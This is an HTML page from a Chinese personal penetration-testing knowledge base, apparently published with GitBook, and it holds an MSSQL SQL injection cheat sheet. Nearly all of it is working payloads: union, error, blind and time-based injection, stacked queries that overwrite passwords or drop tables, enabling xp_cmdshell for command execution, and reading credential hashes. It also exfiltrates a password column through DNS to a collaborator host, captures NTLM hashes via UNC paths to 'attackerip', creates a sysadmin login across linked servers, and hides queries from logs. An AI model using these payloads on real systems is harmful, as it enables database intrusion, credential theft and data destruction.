+        <li class="chapter " data-level="1.3" data-path="../../../../友情链接.html">
+            
+                <a href="../../../../友情链接.html">
+            
+                    
+                    友情链接
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../../../更新日志.html">
+            
+                <a href="../../../../更新日志.html">
+            
+                    
+                    更新日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+        </nav>
+        
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
+    </div>
+
+    <div class="book-body">
+        
+        <div class="body-inner">
+            
+            
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../../.." >07.MSSQL</a>
+    </h1>
+</div>
+
+
+
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                    <section class="normal markdown-section">
+                        
+                        <table>
+<thead>
+<tr>
+<th style="text-align:left">&#x4F5C;&#x8005;</th>
+<th style="text-align:left">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><a href="https://img.shields.io/badge/wjlin0-blog-green" data-lightbox="6e064398-a50d-4068-bba9-e9063718e953" data-title="wjlin0" target="_blank"><img src="https://img.shields.io/badge/wjlin0-blog-green" alt="wjlin0"></a></td>
+<td style="text-align:left">2023-07-05 21:37:29</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mssql-&#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;">MSSQL &#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>&#x63CF;&#x8FF0;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pubs</td>
+<td>MSSQL 2005 &#x4E0A;&#x4E0D;&#x53EF;&#x7528;</td>
+</tr>
+<tr>
+<td>model</td>
+<td>&#x63D0;&#x4F9B;&#x6240;&#x6709;&#x7248;&#x672C;</td>
+</tr>
+<tr>
+<td>msdb</td>
+<td>&#x63D0;&#x4F9B;&#x6240;&#x6709;&#x7248;&#x672C;</td>
+</tr>
+<tr>
+<td>tempdb</td>
+<td>&#x63D0;&#x4F9B;&#x6240;&#x6709;&#x7248;&#x672C;</td>
+</tr>
+<tr>
+<td>northwind</td>
+<td>&#x63D0;&#x4F9B;&#x6240;&#x6709;&#x7248;&#x672C;</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>MSSQL 2000 &#x53CA;&#x66F4;&#x9AD8;&#x7248;&#x672C;&#x4E2D;&#x7684; Availalble</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mssql-&#x6CE8;&#x91CA;">MSSQL &#x6CE8;&#x91CA;</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>&#x63CF;&#x8FF0;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/* MSSQL Comment */</code></td>
+<td>C &#x6837;&#x5F0F;&#x6CE8;&#x91CA;</td>
+</tr>
+<tr>
+<td><code>-- -</code></td>
+<td>SQL &#x6CE8;&#x91CA;</td>
+</tr>
+<tr>
+<td><code>;%00</code></td>
+<td>&#x7A7A;&#x5B57;&#x8282;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mssql-&#x7528;&#x6237;">MSSQL &#x7528;&#x6237;</h2>
+<pre><code class="lang-sql">SELECT CURRENT_USER
+SELECT user_name();
+SELECT system_user;
+SELECT user;
+</code></pre>
+<h2 id="mssql-version">MSSQL Version</h2>
+<pre><code class="lang-sql">SELECT @@version
+</code></pre>
+<h2 id="mssql-&#x4E3B;&#x673A;&#x540D;">MSSQL &#x4E3B;&#x673A;&#x540D;</h2>
+<pre><code class="lang-sql">SELECT HOST_NAME()
+SELECT @@hostname
+SELECT @@SERVERNAME
+SELECT SERVERPROPERTY(&apos;productversion&apos;)
+SELECT SERVERPROPERTY(&apos;productlevel&apos;)
+SELECT SERVERPROPERTY(&apos;edition&apos;);
+</code></pre>
+<h2 id="mssql-&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;">MSSQL &#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;</h2>
+<pre><code class="lang-sql">SELECT DB_NAME()
+</code></pre>
+<h2 id="mssql-&#x6570;&#x636E;&#x5E93;&#x51ED;&#x636E;">MSSQL &#x6570;&#x636E;&#x5E93;&#x51ED;&#x636E;</h2>
+<ul>
+<li>&#xFF1A;&#x54C8;&#x5E0C;&#x732B;&#x6A21;&#x5F0F; 131&#xFF1A; <code>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</code><pre><code class="lang-sql">  SELECT name, password FROM master..sysxlogins
+  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
+  -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
+</code></pre>
+</li>
+<li>&#xFF1A;&#x54C8;&#x5E0C;&#x732B;&#x6A21;&#x5F0F; 132&#xFF1A; <code>0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe</code><pre><code class="lang-sql">  SELECT name, password_hash FROM master.sys.sql_logins
+  SELECT name + &apos;-&apos; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+</code></pre>
+</li>
+</ul>
+<h2 id="mssql-&#x5217;&#x8868;&#x6570;&#x636E;&#x5E93;">MSSQL &#x5217;&#x8868;&#x6570;&#x636E;&#x5E93;</h2>
+<pre><code class="lang-sql">SELECT name FROM master..sysdatabases;
+SELECT DB_NAME(N); &#x2014; for N = 0, 1, 2, &#x2026;
+SELECT STRING_AGG(name, &apos;, &apos;) FROM master..sysdatabases; -- Change delimeter value such as &apos;, &apos; to anything else you want =&gt; master, tempdb, model, msdb   (Only works in MSSQL 2017+)
+</code></pre>
+<h2 id="mssql-&#x5217;&#x8868;&#x5217;">MSSQL &#x5217;&#x8868;&#x5217;</h2>
+<pre><code class="lang-sql">SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#x2018;mytable&#x2019;); &#x2014; for the current DB only
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#x2019;sometable&#x2019;; &#x2014; list colum names and types for master..sometable
+
+SELECT table_catalog, column_name FROM information_schema.columns
+</code></pre>
+<h2 id="mssql-&#x5217;&#x8868;&#x8868;">MSSQL &#x5217;&#x8868;&#x8868;</h2>
+<pre><code class="lang-sql">SELECT name FROM master..sysobjects WHERE xtype = &#x2018;U&#x2019;; &#x2014; use xtype = &#x2018;V&#x2019; for views
+SELECT name FROM someotherdb..sysobjects WHERE xtype = &#x2018;U&#x2019;;
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#x2019;sometable&#x2019;; &#x2014; list colum names and types for master..sometable
+
+SELECT table_catalog, table_name FROM information_schema.columns
+SELECT STRING_AGG(name, &apos;, &apos;) FROM master..sysobjects WHERE xtype = &apos;U&apos;; -- Change delimeter value such as &apos;, &apos; to anything else you want =&gt; trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
+</code></pre>
+<h2 id="&#x57FA;&#x4E8E;-mssql-&#x8054;&#x5408;">&#x57FA;&#x4E8E; MSSQL &#x8054;&#x5408;</h2>
+<pre><code class="lang-sql">-- extract databases names
+$ SELECT name FROM master..sysdatabases
+[*] Injection
+[*] msdb
+[*] tempdb
+
+-- extract tables from Injection database
+$ SELECT name FROM Injection..sysobjects WHERE xtype = &apos;U&apos;
+[*] Profiles
+[*] Roles
+[*] Users
+
+-- extract columns for the table Users
+$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &apos;Users&apos;)
+[*] UserId
+[*] UserName
+
+-- Finally extract the data
+$ SELECT  UserId, UserName from Users
+</code></pre>
+<h2 id="mssql-&#x57FA;&#x4E8E;&#x9519;&#x8BEF;">MSSQL &#x57FA;&#x4E8E;&#x9519;&#x8BEF;</h2>
+<pre><code class="lang-sql">For integer inputs : convert(int,@@version)
+For integer inputs : cast((SELECT @@version) as int)
+
+For string inputs   : &apos; + convert(int,@@version) + &apos;
+For string inputs   : &apos; + cast((SELECT @@version) as int) + &apos;
+</code></pre>
+<h2 id="mssql-&#x57FA;&#x4E8E;&#x76F2;&#x7684;">MSSQL &#x57FA;&#x4E8E;&#x76F2;&#x7684;</h2>
+<pre><code class="lang-sql">AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+
+AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
+AND UNICODE(SUBSTRING((SELECT &apos;A&apos;),1,1))&gt;64-- 
+AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;
+
+AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90
+
+SELECT @@version WHERE @@version LIKE &apos;%12.0.2000.8%&apos;
+
+WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
+SELECT message FROM data WHERE row = 1 and message like &apos;t%&apos;
+</code></pre>
+<h2 id="mssql-&#x57FA;&#x4E8E;&#x65F6;&#x95F4;">MSSQL &#x57FA;&#x4E8E;&#x65F6;&#x95F4;</h2>
+<pre><code class="lang-sql">ProductID=1;waitfor delay &apos;0:0:10&apos;--
+ProductID=1);waitfor delay &apos;0:0:10&apos;--
+ProductID=1&apos;;waitfor delay &apos;0:0:10&apos;--
+ProductID=1&apos;);waitfor delay &apos;0:0:10&apos;--
+ProductID=1));waitfor delay &apos;0:0:10&apos;--
+
+IF([INFERENCE]) WAITFOR DELAY &apos;0:0:[SLEEPTIME]&apos;
+IF 1=1 WAITFOR DELAY &apos;0:0:5&apos; ELSE WAITFOR DELAY &apos;0:0:0&apos;;
+</code></pre>
+<h2 id="mssql-&#x5806;&#x53E0;&#x67E5;&#x8BE2;">MSSQL &#x5806;&#x53E0;&#x67E5;&#x8BE2;</h2>
+<ul>
+<li><p>&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8BED;&#x53E5;&#x7EC8;&#x6B62;&#x7B26;</p>
+<pre><code class="lang-sql">  -- multiple SELECT statements
+  SELECT &apos;A&apos;SELECT &apos;B&apos;SELECT &apos;C&apos;
+
+  -- updating password with a stacked query
+  SELECT id, username, password FROM users WHERE username = &apos;admin&apos;exec(&apos;update[users]set[password]=&apos;&apos;a&apos;&apos;&apos;)--
+
+  -- using the stacked query to enable xp_cmdshell
+  -- you won&apos;t have the output of the query, redirect it to a file 
+  SELECT id, username, password FROM users WHERE username = &apos;admin&apos;exec(&apos;sp_configure&apos;&apos;show advanced option&apos;&apos;,&apos;&apos;1&apos;&apos;reconfigure&apos;)exec(&apos;sp_configure&apos;&apos;xp_cmdshell&apos;&apos;,&apos;&apos;1&apos;&apos;reconfigure&apos;)--
+</code></pre>
+</li>
+<li><p>&#x4F7F;&#x7528;&#x5206;&#x53F7;&#x201C;&#xFF1B;&#x201D;&#x6DFB;&#x52A0;&#x53E6;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;</p>
+<pre><code class="lang-sql">  ProductID=1; DROP members--
+</code></pre>
+</li>
+</ul>
+<h2 id="mssql-&#x8BFB;&#x53D6;&#x6587;&#x4EF6;">MSSQL &#x8BFB;&#x53D6;&#x6587;&#x4EF6;</h2>
+<p><strong>&#x6743;&#x9650;</strong>&#xFF1A;&#x9009;&#x9879;&#x9700;&#x8981;&#x6216; <code>ADMINISTER DATABASE BULK OPERATIONS</code> &#x6743;&#x9650;&#x3002;</p>
+<pre><code class="lang-sql">-1 union select null,(select x from OpenRowset(BULK &apos;C:\Windows\win.ini&apos;,SINGLE_CLOB) R(x)),null,null
+</code></pre>
+<h2 id="mssql-&#x547D;&#x4EE4;&#x6267;&#x884C;">MSSQL &#x547D;&#x4EE4;&#x6267;&#x884C;</h2>
+<pre><code class="lang-sql">EXEC xp_cmdshell &quot;net user&quot;;
+EXEC master.dbo.xp_cmdshell &apos;cmd.exe dir c:&apos;;
+EXEC master.dbo.xp_cmdshell &apos;ping 127.0.0.1&apos;;
+</code></pre>
+<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x6FC0;&#x6D3B; xp_cmdshell&#xFF08;&#x5728; SQL Server 2005 &#x4E2D;&#x9ED8;&#x8BA4;&#x4E3A;&#x7981;&#x7528;&#xFF09;</p>
+<pre><code class="lang-sql">EXEC sp_configure &apos;show advanced options&apos;,1;
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;,1;
+RECONFIGURE;
+</code></pre>
+<p>&#x4E0E; MSSQL &#x5B9E;&#x4F8B;&#x4EA4;&#x4E92;&#x3002;</p>
+<pre><code class="lang-powershell">sqsh -S 192.168.1.X -U sa -P superPassword
+python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
+</code></pre>
+<p>&#x6267;&#x884C; Python &#x811A;&#x672C;</p>
+<blockquote>
+<p>&#x7531;&#x4E0D;&#x540C;&#x4E8E;&#x4F7F;&#x7528; xp_cmdshell &#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x7528;&#x6237;&#x6267;&#x884C;</p>
+</blockquote>
+<pre><code class="lang-powershell">#Print the user being used (and execute commands)
+EXECUTE sp_execute_external_script @language = N&apos;Python&apos;, @script = N&apos;print(__import__(&quot;getpass&quot;).getuser())&apos;
+EXECUTE sp_execute_external_script @language = N&apos;Python&apos;, @script = N&apos;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&apos;
+#Open and read a file
+EXECUTE sp_execute_external_script @language = N&apos;Python&apos;, @script = N&apos;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&apos;
+#Multiline
+EXECUTE sp_execute_external_script @language = N&apos;Python&apos;, @script = N&apos;
+import sys
+print(sys.version)
+&apos;
+GO
+</code></pre>
+<h2 id="mssql-&#x5E26;&#x5916;">MSSQL &#x5E26;&#x5916;</h2>
+<h3 id="mssql-dns-&#x5916;&#x8FC7;&#x6EE4;">MSSQL DNS &#x5916;&#x8FC7;&#x6EE4;</h3>
+<p><a href="https://twitter.com/ptswarm/status/1313476695295512578/photo/1&#x4E2D;&#x7684;&#x6280;&#x672F;" target="_blank">https://twitter.com/ptswarm/status/1313476695295512578/photo/1&#x4E2D;&#x7684;&#x6280;&#x672F;</a></p>
+<pre><code class="lang-powershell"># Permissions: Requires VIEW SERVER STATE permission on the server.
+1 and exists(select * from fn_xe_file_target_read_file(&apos;C:\*.xel&apos;,&apos;\\&apos;%2b(select pass from users where id=1)%2b&apos;.xxxx.burpcollaborator.net\1.xem&apos;,null,null))
+
+# Permissions: Requires the CONTROL SERVER permission.
+1 (select 1 where exists(select * from fn_get_audit_file(&apos;\\&apos;%2b(select pass from users where id=1)%2b&apos;.xxxx.burpcollaborator.net\&apos;,default,default)))
+1 and exists(select * from fn_trace_gettable(&apos;\\&apos;%2b(select pass from users where id=1)%2b&apos;.xxxx.burpcollaborator.net\1.trc&apos;,default))
+</code></pre>
+<h3 id="mssql-unc-&#x8DEF;&#x5F84;">MSSQL UNC &#x8DEF;&#x5F84;</h3>
+<p>MSSQL &#x652F;&#x6301;&#x5806;&#x53E0;&#x67E5;&#x8BE2;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6307;&#x5411; IP &#x5730;&#x5740;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; <code>xp_dirtree</code> &#x51FD;&#x6570;&#x5217;&#x51FA; SMB &#x5171;&#x4EAB;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5E76;&#x83B7;&#x53D6; NTLMv2 &#x54C8;&#x5E0C;&#x3002;</p>
+<pre><code class="lang-sql">1&apos;; use master; exec xp_dirtree &apos;\\10.10.15.XX\SHARE&apos;;--
+</code></pre>
+<pre><code class="lang-sql">xp_dirtree &apos;\\attackerip\file&apos;
+xp_fileexist &apos;\\attackerip\file&apos;
+BACKUP LOG [TESTING] TO DISK = &apos;\\attackerip\file&apos;
+BACKUP DATABASE [TESTING] TO DISK = &apos;\\attackeri\file&apos;
+RESTORE LOG [TESTING] FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE DATABASE [TESTING] FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE HEADERONLY FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE FILELISTONLY FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE LABELONLY FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE REWINDONLY FROM DISK = &apos;\\attackerip\file&apos;
+RESTORE VERIFYONLY FROM DISK = &apos;\\attackerip\file&apos;
+</code></pre>
+<h2 id="mssql-&#x4F7F;&#x7528;&#x6237;&#x6210;&#x4E3A;-dba&#xFF08;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5458;&#xFF09;">MSSQL &#x4F7F;&#x7528;&#x6237;&#x6210;&#x4E3A; DBA&#xFF08;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5458;&#xFF09;</h2>
+<pre><code class="lang-sql">EXEC master.dbo.sp_addsrvrolemember &apos;user&apos;, &apos;sysadmin;
+</code></pre>
+<h2 id="mssql-&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x94FE;&#x63A5;">MSSQL &#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x94FE;&#x63A5;</h2>
+<blockquote>
+<p>&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x94FE;&#x63A5;&#x751A;&#x81F3;&#x53EF;&#x4EE5;&#x8DE8;&#x6797;&#x4FE1;&#x4EFB;&#x8FDB;&#x884C;&#x5DE5;&#x4F5C;&#x3002;</p>
+</blockquote>
+<pre><code class="lang-powershell">msf&gt; use exploit/windows/mssql/mssql_linkcrawler
+[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
+</code></pre>
+<p>&#x4EBA;&#x5DE5;&#x5F00;&#x91C7;</p>
+<pre><code class="lang-sql">-- find link
+select * from master..sysservers
+
+-- execute query through the link
+select * from openquery(&quot;dcorp-sql1&quot;, &apos;select * from master..sysservers&apos;)
+select version from openquery(&quot;linkedserver&quot;, &apos;select @@version as version&apos;);
+
+-- chain multiple openquery
+select version from openquery(&quot;link1&quot;,&apos;select version from openquery(&quot;link2&quot;,&quot;select @@version as version&quot;)&apos;)
+
+-- execute shell commands
+EXECUTE(&apos;sp_configure &apos;&apos;xp_cmdshell&apos;&apos;,1;reconfigure;&apos;) AT LinkedServer
+select 1 from openquery(&quot;linkedserver&quot;,&apos;select 1;exec master..xp_cmdshell &quot;dir c:&quot;&apos;)
+
+-- create user and give admin privileges
+EXECUTE(&apos;EXECUTE(&apos;&apos;CREATE LOGIN hacker WITH PASSWORD = &apos;&apos;&apos;&apos;P@ssword123.&apos;&apos;&apos;&apos; &apos;&apos;) AT &quot;DOMINIO\SERVER1&quot;&apos;) AT &quot;DOMINIO\SERVER2&quot;
+EXECUTE(&apos;EXECUTE(&apos;&apos;sp_addsrvrolemember &apos;&apos;&apos;&apos;hacker&apos;&apos;&apos;&apos; , &apos;&apos;&apos;&apos;sysadmin&apos;&apos;&apos;&apos; &apos;&apos;) AT &quot;DOMINIO\SERVER1&quot;&apos;) AT &quot;DOMINIO\SERVER2&quot;
+</code></pre>
+<h2 id="&#x5217;&#x51FA;&#x6743;&#x9650;">&#x5217;&#x51FA;&#x6743;&#x9650;</h2>
+<p>&#x5217;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x6709;&#x6548;&#x6743;&#x9650;&#x3002;</p>
+<pre><code class="lang-sql">SELECT * FROM fn_my_permissions(NULL, &apos;SERVER&apos;);
+</code></pre>
+<p>&#x5217;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6709;&#x6548;&#x6743;&#x9650;&#x3002;</p>
+<pre><code class="lang-sql">SELECT * FROM fn_my_permissions (NULL, &apos;DATABASE&apos;);
+</code></pre>
+<p>&#x5217;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x5BF9;&#x89C6;&#x56FE;&#x7684;&#x6709;&#x6548;&#x6743;&#x9650;&#x3002;</p>
+<pre><code>SELECT * FROM fn_my_permissions(&apos;Sales.vIndividualCustomer&apos;, &apos;OBJECT&apos;) ORDER BY subentity_name, permission_name;
+</code></pre><p>&#x68C0;&#x67E5;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x662F;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x89D2;&#x8272;&#x7684;&#x6210;&#x5458;&#x3002;</p>
+<pre><code class="lang-sql">-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
+SELECT is_srvrolemember(&apos;sysadmin&apos;);
+</code></pre>
+<h2 id="mssql-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;">MSSQL &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</h2>
+<p>&#x5728;&#x67E5;&#x8BE2;&#x4E2D;&#x4F7F;&#x7528; <code>SP_PASSWORD</code> &#x53EF;&#x4EE5;&#x9690;&#x85CF;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#xFF1A;</p>
+<pre><code class="lang-sql">-- &apos;sp_password&apos; was found in the text of this event.
+-- The text has been replaced with this comment for security reasons.
+</code></pre>
+<h2 id="&#x53C2;&#x8003;&#x6587;&#x732E;">&#x53C2;&#x8003;&#x6587;&#x732E;</h2>
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank">Pentest Monkey-mssql sql &#x6CE8;&#x5165;&#x5907;&#x5FD8;&#x5355;</a></li>
+<li><a href="https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20&#x201C;Order%20By&#x201D;%20clause%20(MSSQL" target="_blank">&#x57FA;&#x4E8E;&#x9519;&#x8BEF;-SQL &#x6CE8;&#x5165;</a>.pdf&#xFF09;</li>
+<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links" target="_blank">MSSQL &#x53EF;&#x4FE1;&#x94FE;&#x63A5;-HackTricks.xyz</a></li>
+<li><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank">SQL Server-&#x94FE;&#x63A5;&#x2026;&#x94FE;&#x63A5;&#x2026;&#x94FE;&#x63A5;&#x548C;&#x5916;&#x58F3;&#xFF1A;&#x5982;&#x4F55;&#x7834;&#x89E3; SQL Server &#x4E2D;&#x7684;&#x6570;&#x636E;&#x5E93;&#x94FE;&#x63A5;&#xFF01;-Antti Rantasaari-2013 &#x5E74; 6 &#x6708; 6 &#x65E5;</a></li>
+<li><a href="https://github.com/NetSPI/DAFT" target="_blank">DAFT&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x5BA1;&#x8BA1;&#x6846;&#x67B6;&#x548C;&#x5DE5;&#x5177;&#x5305;-NetSPI</a></li>
+<li><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank">SQL Server UNC &#x8DEF;&#x5F84;&#x6CE8;&#x5165; Cheatsheet-nullbind</a></li>
+<li><a href="https://www.exploit-db.com/papers/12975" target="_blank">&#x5B8C;&#x6574; MSSQL &#x6CE8;&#x5165; PWNage-ZeQ3uL&amp;&amp;JabAv0C-2009 &#x5E74; 1 &#x6708; 28 &#x65E5;</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15" target="_blank">Microsoft-sys.fn_my_permissions&#xFF08;Transact-SQL&#xFF09;</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" target="_blank">Microsoft-IS_SRVROLEMEMBER&#xFF08;Transact-SQL&#xFF09;</a></li>
+<li><a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/" target="_blank">&#x7531;&#x4E8E;&#x9009;&#x62E9;&#x4E86; Unorthodox MSSQL &#x8BBE;&#x8BA1;&#xFF0C;AWS WAF &#x5BA2;&#x6237;&#x7AEF;&#x6613;&#x53D7; SQL &#x6CE8;&#x5165;&#x653B;&#x51FB;-Marc Olivier Bergeron-2023 &#x5E74; 6 &#x6708; 21 &#x65E5;</a></li>
+</ul>
+
+                        
+                    </section>
+                    
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+        <a href="06.SQLite.html" class="navigation navigation-prev " aria-label="Previous page: 06.SQLite">
+            <i class="fa fa-angle-left"></i>
+        </a>
+        
+        
+        <a href="08.HQL.html" class="navigation navigation-next " aria-label="Next page: 08.HQL">
+            <i class="fa fa-angle-right"></i>
+        </a>
+        
+        
+        
+    </div>
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"07.MSSQL","level":"1.2.1.2.1.7","depth":5,"next":{"title":"08.HQL","level":"1.2.1.2.1.8","depth":5,"path":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/08.HQL.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/08.HQL.md","articles":[]},"previous":{"title":"06.SQLite","level":"1.2.1.2.1.6","depth":5,"path":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.SQLite.md","ref":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.SQLite.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","code","theme-d4t@latest","-lunr","-search","-sharing","search-pro-fixed","-highlight","lightbox","donate","github","flexible-alerts","prism-themes","back-to-top-button","auto-scroll-table","hide-element","chapter-fold","donate","expandable-chapters"],"root":"./docs","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy wjlin0 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","ps1","cmd","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl","shell","python3","bat","curl"]},"github":{"url":"https://github.com/wjlin0"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/images/logo.svg","favicon":"/images/favicon.ico"},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/images/wechat-pay.jpg","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/images/wechat-pay.jpg","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"prism-themes":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"wjlin0","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"d4t":{"nav":[{"url":"https://github.com/wjlin0/pathScan","target":"_blank","name":"pathScan"},{"url":"https://www.wjlin0.com","target":"_blank","name":"wjlin0's blog"}]}},"title":"wjlin0 